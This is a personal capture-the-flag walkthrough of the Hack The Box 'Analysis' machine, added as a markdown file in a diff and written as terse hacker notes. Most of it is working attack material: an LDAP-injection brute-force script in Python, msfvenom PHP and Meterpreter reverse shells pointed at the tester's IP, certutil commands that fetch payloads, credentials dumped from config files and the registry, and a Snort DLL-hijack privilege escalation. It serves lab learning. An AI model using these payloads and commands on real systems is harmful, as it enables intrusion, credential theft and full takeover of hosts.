@@ -1,0 +1,504 @@
+# Analysis
+
+#recon 
+
+Nmap Scan
+
+┌─[sed@parrot]─[~/htb/analysis.htb]
+└──╼ $nmap -sCV -T5 10.129.232.111
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-24 01:54 IST
+Warning: 10.129.232.111 giving up on port because retransmission cap hit (2).
+Nmap scan report for analysis.htb (10.129.232.111)
+Host is up (0.24s latency).
+Not shown: 949 closed tcp ports (conn-refused), 38 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-server-header: 
+|   Microsoft-HTTPAPI/2.0
+|_  Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Site doesn't have a title (text/html).
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-23 20:25:17Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+3306/tcp open  mysql         MySQL (unauthorized)
+Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-01-23T20:25:34
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 63.05 seconds
+
+GoBuster 
+
+┌─[✗]─[sed@parrot]─[~/htb/analysis.htb]
+└──╼ $gobuster vhost -u http://analysis.htb/ -t 100 -w /snap/seclists/current/Discovery/DNS/subdomains-top1million-110000.txt 2>/dev/null
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:          http://analysis.htb/
+[+] Method:       GET
+[+] Threads:      100
+[+] Wordlist:     /snap/seclists/current/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:   gobuster/3.1.0
+[+] Timeout:      10s
+===============================================================
+2024/01/24 02:04:23 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: internal.analysis.htb (Status: 403) [Size: 1268]
+
+─[sed@parrot]─[~/htb/analysis.htb]
+└──╼ $gobuster dir -u http://internal.analysis.htb -x php,html,txt -t 100 --no-error -w /snap/seclists/current/Discovery/Web-Content/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://internal.analysis.htb
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /snap/seclists/current/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,txt
+[+] Timeout:                 10s
+===============================================================
+2024/01/24 02:10:59 Starting gobuster in directory enumeration mode
+===============================================================
+/users                (Status: 301) [Size: 170] [--> http://internal.analysis.htb/users/]
+/dashboard            (Status: 301) [Size: 174] [--> http://internal.analysis.htb/dashboard/]
+/Users                (Status: 301) [Size: 170] [--> http://internal.analysis.htb/Users/]    
+/employees            (Status: 301) [Size: 174] [--> http://internal.analysis.htb/employees/]
+
+┌─[sed@parrot]─[~/htb/analysis.htb]
+└──╼ $gobuster dir -u http://internal.analysis.htb/users -x php,html,txt -t 100 --no-error -w /snap/seclists/current/Discovery/Web-Content/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://internal.analysis.htb/users
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /snap/seclists/current/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,txt
+[+] Timeout:                 10s
+===============================================================
+2024/01/24 02:11:53 Starting gobuster in directory enumeration mode
+===============================================================
+/list.php             (Status: 200) [Size: 17]
+
+┌─[sed@parrot]─[~/htb/analysis.htb]
+└──╼ $gobuster dir -u http://internal.analysis.htb/employees -x php,html,txt -t 100 --no-error -w /snap/seclists/current/Discovery/Web-Content/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://internal.analysis.htb/employees
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /snap/seclists/current/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,txt
+[+] Timeout:                 10s
+===============================================================
+2024/01/24 02:12:59 Starting gobuster in directory enumeration mode
+===============================================================
+/login.php            (Status: 200) [Size: 1085]
+/Login.php            (Status: 200) [Size: 1085]
+
+┌─[sed@parrot]─[~/htb/analysis.htb]
+└──╼ $gobuster dir -u http://internal.analysis.htb/dashboard -x php -t 100 --no-error -w /snap/seclists/current/Discovery/Web-Content/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://internal.analysis.htb/dashboard
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /snap/seclists/current/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+2024/01/24 02:15:27 Starting gobuster in directory enumeration mode
+===============================================================
+/img                  (Status: 301) [Size: 178] [--> http://internal.analysis.htb/dashboard/img/]
+/index.php            (Status: 200) [Size: 38]                                                   
+/uploads              (Status: 301) [Size: 182] [--> http://internal.analysis.htb/dashboard/uploads/]
+/upload.php           (Status: 200) [Size: 0]                                                        
+/details.php          (Status: 200) [Size: 35]                                                       
+/css                  (Status: 301) [Size: 178] [--> http://internal.analysis.htb/dashboard/css/]    
+/Index.php            (Status: 200) [Size: 38]                                                       
+/lib                  (Status: 301) [Size: 178] [--> http://internal.analysis.htb/dashboard/lib/]    
+/form.php             (Status: 200) [Size: 35]                                                       
+/js                   (Status: 301) [Size: 177] [--> http://internal.analysis.htb/dashboard/js/]     
+/logout.php           (Status: 302) [Size: 3] [--> ../employees/login.php]                           
+/tickets.php          (Status: 200) [Size: 35]                                                       
+/emergency.php        (Status: 200) [Size: 35]                                                       
+/IMG                  (Status: 301) [Size: 178] [--> http://internal.analysis.htb/dashboard/IMG/]    
+/INDEX.php            (Status: 200) [Size: 38]                                                       
+/Details.php          (Status: 200) [Size: 35]                                                       
+/Form.php             (Status: 200) [Size: 35]   
+
+injected a simple payload got the user 
+http://internal.analysis.htb/users/list.php?name=*
+
+Search result
+
+Username	Last Name	First Name	Company	Department	Office Phone	Fax	Mobile	DDI	E-Mail Address	Home Phone
+technician		technician								
+
+assuming the default user will be 
+technician@analysis.htb
+
+using fuff to find total number of Chars in description
+
+ ffuf -u "http://internal.analysis.htb/users/list.php?name=technician)(description=FUZZ*))%00"  -w /usr/share/wordlists/seclists/Fuzzing/alphanum-case-extra.txt -c -ac -fw 1
+
+      /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://internal.analysis.htb/users/list.php?name=technician)(description=FUZZ*))%00
+ :: Wordlist         : FUZZ: /snap/seclists/current/Fuzzing/alphanum-case-extra.txt
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 1
+________________________________________________
+
+9                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 395ms]
+                        [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 256ms]
+:: Progress: [95/95] :: Job [1/1] :: 177 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
+
+python script to bruteforce characters
+
+import requests
+import string
+import sys
+
+headers = {
+    'Host': 'internal.analysis.htb',
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+    'Accept-Language': 'en-US,en;q=0.5',
+    # 'Accept-Encoding': 'gzip, deflate, br',
+    'Referer': 'http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=*)(password=*)',
+    'Connection': 'keep-alive',
+    'Upgrade-Insecure-Requests': '1',
+}
+
+forbidden_chars = ['*']
+
+def fuzz():
+    found = ""
+    while True:
+        flag = False
+        for fuzz in string.printable:
+            if fuzz in forbidden_chars and len(found) != 6: # the 6th char of fuzz string is really * with no other meaning
+                continue
+            if len(found) != 6:
+                fuzzing = fuzz + "*"
+            else:
+                fuzzing = fuzz
+
+            url = f"http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=*)(description={found}{fuzzing})"
+            response = requests.get(url, headers=headers, verify=False)
+            sys.stdout.write(f"\r[*] FUZZING: {found}{fuzz}")
+            sys.stdout.flush()
+
+            if "technician" in response.text:
+                flag = True
+                found += fuzz
+                break
+
+        if not flag:
+            break
+    print(f"\r[!] FUZZING Done, Found: {found}")
+
+if __name__ == '__main__':
+    fuzz()
+
+
+┌[parrot]─[15:11-24/01]─[/home/sed/htb/analysis.htb]
+└╼sed$python3 fuzz.py
+[*] FUZZING: 97NTtl*4QP96Bv 
+[*] FUZZING: 97NTtl*4QP96Bv
+[*] FUZZING: 97NTtl*4QP96Bv
+[!] FUZZING Done, Found: 97NTtl*4QP96Bv
+
+found password
+
+login 
+technician@analysis.htb
+pass
+97NTtl*4QP96Bv
+
+successfully logged in
+
+crafted a php reverse shell 
+
+└╼sed$msfvenom -p php/reverse_php LHOST=10.10.16.6 LPORT=6969 -o shell.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 3024 bytes
+Saved as: shell.php
+
+and uploaded to http://internal.analysis.htb//dashboard/form.php
+
+╼sed$curl http://internal.analysis.htb/dashboard/uploads/shell.php
+    /*⏎                                                                
+
+    manually run the shell
+
+
+ ╼sed$sudo rlwrap nc -lnvp 6969
+listening on [any] 6969 ...
+connect to [10.10.16.6] from (UNKNOWN) [10.129.231.203] 55026
+whoami
+analysis\svc_web
+
+so the shell is closing in 60 seconds need to upload shell inside machine
+ using metasploit
+
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4200 -f exe -o shell.exe
+
+  
+[msf](Jobs:0 Agents:0) >> use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost tun0
+lhost => tun0
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 4200
+lport => 4200
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+
+
+
+certutil -urlcache -f http://10.10.16.6:8080/shell.exe shell.exe 
+
+
+msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+
+[-] Handler failed to bind to 10.10.16.16:4200:-  -
+[*] Started reverse TCP handler on 0.0.0.0:4200 
+[*] Sending stage (200774 bytes) to 10.129.231.203
+[*] Meterpreter session 1 opened (10.10.16.6:4200 -> 10.129.231.203:62931) at 2024-01-24 16:32:26 +0530
+
+(Meterpreter 1)(C:\inetpub\internal\dashboard\uploads) > 
+
+got some userinfo
+
+C:\inetpub\internal\users>type list.php
+type list.php
+<?php
+
+//LDAP Bind paramters, need to be a normal AD User account.
+error_reporting(0);
+$ldap_password = 'N1G6G46G@G!j';
+$ldap_username = 'webservice@analysis.htb';
+$ldap_connection = ldap_connect("analysis.htb");
+
+C:\inetpub\internal\employees>type login.php
+type login.php
+<?php 
+ $host = "localhost";  
+ $username = "db_master";  
+ $password = '0$TBO7H8s12yh&';  
+ $database = "employees";  
+
+registry stores default password: reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon"
+
+
+C:\inetpub\internal\employees>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon"
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon"
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon
+    AutoRestartShell    REG_DWORD    0x1
+    Background    REG_SZ    0 0 0
+    CachedLogonsCount    REG_SZ    10
+    DebugServerCommand    REG_SZ    no
+    DefaultDomainName    REG_SZ    analysis.htb.
+    DefaultUserName    REG_SZ    jdoe
+    DisableBackButton    REG_DWORD    0x1
+    EnableSIHostIntegration    REG_DWORD    0x1
+    ForceUnlockLogon    REG_DWORD    0x0
+    LegalNoticeCaption    REG_SZ    
+    LegalNoticeText    REG_SZ    
+    PasswordExpiryWarning    REG_DWORD    0x5
+    PowerdownAfterShutdown    REG_SZ    0
+    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
+    ReportBootOk    REG_SZ    1
+    Shell    REG_SZ    explorer.exe
+    ShellCritical    REG_DWORD    0x0
+    ShellInfrastructure    REG_SZ    sihost.exe
+    SiHostCritical    REG_DWORD    0x0
+    SiHostReadyTimeOut    REG_DWORD    0x0
+    SiHostRestartCountLimit    REG_DWORD    0x0
+    SiHostRestartTimeGap    REG_DWORD    0x0
+    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
+    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
+    WinStationsDisabled    REG_SZ    0
+    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe
+    scremoveoption    REG_SZ    0
+    DisableCAD    REG_DWORD    0x1
+    LastLogOffEndTimePerfCounter    REG_QWORD    0x103bff874
+    ShutdownFlags    REG_DWORD    0x13
+    DisableLockWorkstation    REG_DWORD    0x0
+    AutoAdminLogon    REG_SZ    1
+    DefaultPassword    REG_SZ    7y4Z4^*y9Zzj
+    AutoLogonSID    REG_SZ    S-1-5-21-916175351-3772503854-3498620144-1103
+    LastUsedUsername    REG_SZ    jdoe
+
+got jdoe:7y4Z4^*y9Zzj
+
+user pass
+
+using evil winrm
+
+ evil-winrm -u "jdoe" -i "analysis.htb" -p "7y4Z4^*y9Zzj"
+
+ got user flag
+
+ *Evil-WinRM* PS C:\Users\jdoe\Desktop> type user.txt
+acb14fde007f144acbc9bbfced7a8e3d
+
+*Evil-WinRM* PS C:\> dir
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        6/12/2023  10:01 AM                inetpub
+d-----        11/5/2022   8:14 PM                PerfLogs
+d-----         5/8/2023  10:20 AM                PHP
+d-----         7/9/2023  10:54 AM                private
+d-r---       11/18/2023   9:56 AM                Program Files
+d-----         5/8/2023  10:11 AM                Program Files (x86)
+d-----         7/9/2023  10:57 AM                Snort
+d-r---        5/26/2023   2:20 PM                Users
+d-----        1/10/2024   3:52 PM                Windows
+-a----        1/24/2024  12:22 PM         308526 snortlog.txt
+
+
+found Snort Version 2.9.20-WIN64 GRE
+
+CVE-2016-1417 has its exploit
+
+
+┌[parrot]─[17:11-24/01]─[/home/sed/htb/analysis.htb]
+└╼sed$msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.6 LPORT=4200 -f dll -o tcapi.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of dll file: 9216 bytes
+Saved as: tcapi.dll
+┌[parrot]─[17:11-24/01]─[/home/sed/htb/analysis.htb]
+└╼sed$python3 -m http.server 8080
+
+*Evil-WinRM* PS C:\Snort\lib\snort_dynamicpreprocessor> certutil.exe -urlcache -split -f http://10.10.16.6:8080/tcapi.dll tcapi.dll
+****  Online  ****
+  0000  ...
+  2400
+CertUtil: -URLCache command completed successfully.
+
+again metasploit shell
+
+msf](Jobs:0 Agents:0) >> use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> et payload windows/x64/meterpreter/reverse_tcp
+[-] Unknown command: et
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 10.10.16.6
+lhost => 10.10.16.6
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 4200
+lport => 4200
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> options
+
+
+make empty pcap file
+
+*Evil-WinRM* PS C:\Snort\bin> type nul > hax.pcap
+Cannot find path 'C:\Snort\bin\nul' because it does not exist.
+At line:1 char:1
++ type nul > hax.pcap
++ ~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Snort\bin\nul:String) [Get-Content], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
+
+
+
+./snort.exe -c C:\Snort\etc\snort.conf -r hax.pcap
+
+Evil-WinRM* PS C:\Snort\bin> ./snort.exe -c C:\Snort\etc\snort.conf -r hax.pcap
+
+snort.exe : Running in IDS mode
+    + CategoryInfo          : NotSpecified: (Running in IDS mode:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+        --== Initializing Snort ==--Initializing Output Plugins!Initializing Preprocessors!Initializing Plug-ins!Parsing Rules file "C:\Snort\etc\snort.conf"PortVar 'HTTP_PORTS' defined :  [ 80:81 311 383 591 593 901 1220 1414 1741 1830 2301 2381 2809 3037 3128 3702 4343 4848 5250 6988 7000:7001 7144:7145 7510 7777 7779 8000 8008 8014 8028 8080 8085 8088 8090 8118 8123 8180:8181 8243 8280 8300 8800 8888 8899 9000 9060 9080 9090:9091 9443 9999 11371 34443:34444 41080 50002 55555 ]PortVar 'SHELLCODE_PORTS' defined :  [ 0:79 81:65535 ]PortVar 'ORACLE_PORTS' defined :  [ 1024:65535 ]PortVar 'SSH_PORTS' defined :  [ 22 ]PortVar 'FTP_PORTS' defined :  [ 21 2100 3535 ]PortVar 'SIP_PORTS' defined :  [ 5060:5061 5600 ]PortVar 'FILE_DATA_PORTS' defined :  [ 80:81 110 143 311 383 591 593 901 1220 1414 1741 1830 2301 2381 2809 3037 3128 3702 4343 4848 5250 6988 7000:7001 7144:7145 7510 7777 7779 8000 8008 8014 8028 8080 8085 8088 8090 8118 8123 8180:8181 8243 8280 8300 8800 8888 8899 9000 9060 9080 9090:9091 9443 9999 11371 34443:34444 41080 50002 55555 ]PortVar 'GTP_PORTS' defined :  [ 2123 2152 3386 ]Detection:   Search-Method = AC-Full-Q    Split Any/Any group = enabled    Search-Method-Optimizations = enabled    Maximum pattern length = 20Tagged Packet Limit: 256Loading dynamic engine C:\Snort\lib\snort_dynamicengine\sf_engine.dll... doneLoading all dynamic preprocessor libs from C:\Snort\lib\snort_dynamicpreprocessor...  Loading dynamic preprocessor library C:\Snort\lib\snort_dynamicpreprocessor\sf_dce2.dll... done  Loading dynamic preprocessor library C:\Snort\lib\snort_dynamicpreprocessor\sf_dnp3.dll... done  Loading dynamic preprocessor library C:\Snort\lib\snort_dynamicpreprocessor\sf_dns.dll... done  Loading dynamic preprocessor library C:\Snort\lib\snort_dynamicpreprocessor\sf_ftptelnet.dll... done  Loading dynamic preprocessor library C:\Snort\lib\snort_dynamicpreprocessor\sf_gtp.dll... done  Loading dynamic preprocessor library C:\Snort\lib\snort_dynamicpreprocessor\sf_imap.dll... done  Loading dynamic preprocessor library C:\Snort\lib\snort_dynamicpreprocessor\sf_modbus.dll... done  Loading dynamic preprocessor library C:\Snort\lib\snort_dynamicpreprocessor\sf_pop.dll... done  Loading dynamic preprocessor library C:\Snort\lib\snort_dynamicpreprocessor\sf_reputation.dll... done  Loading dynamic preprocessor library C:\Snort\lib\snort_dynamicpreprocessor\sf_sdf.dll... done  Loading dynamic preprocessor library C:\Snort\lib\snort_dynamicpreprocessor\sf_sip.dll... done  Loading dynamic preprocessor library C:\Snort\lib\snort_dynamicpreprocessor\sf_smtp.dll... done  Loading dynamic preprocessor library C:\Snort\lib\snort_dynamicpreprocessor\sf_ssh.dll... done  Loading dynamic preprocessor library C:\Snort\lib\snort_dynamicpreprocessor\sf_ssl.dll... done  Loading dynamic preprocessor library C:\Snort\lib\snort_dynamicpreprocessor\tcapi.dll... *Evil-WinRM* PS C:\Snort\bin> 
+
+doneee
+
+got the Administrator flag
+
+
+f](Jobs:0 Agents:0) exploit(multi/handler) >> run
+
+[*] Started reverse TCP handler on 10.10.16.6:4200 
+[*] Sending stage (200774 bytes) to 10.129.231.203
+[*] Meterpreter session 1 opened (10.10.16.6:4200 -> 10.129.231.203:63553) at 2024-01-24 17:18:13 +0530
+
+(Meterpreter 1)(C:\Windows\system32) > shell
+Process 8260 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.5329]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+analysis\administrateur
+
+C:\Windows\system32>
+
+got the root flag 
+
+
+C:\Users\Administrateur\Desktop>type root.txt
+type root.txt
+28c732a266a80966dc51f7ee8d92e576
+
+
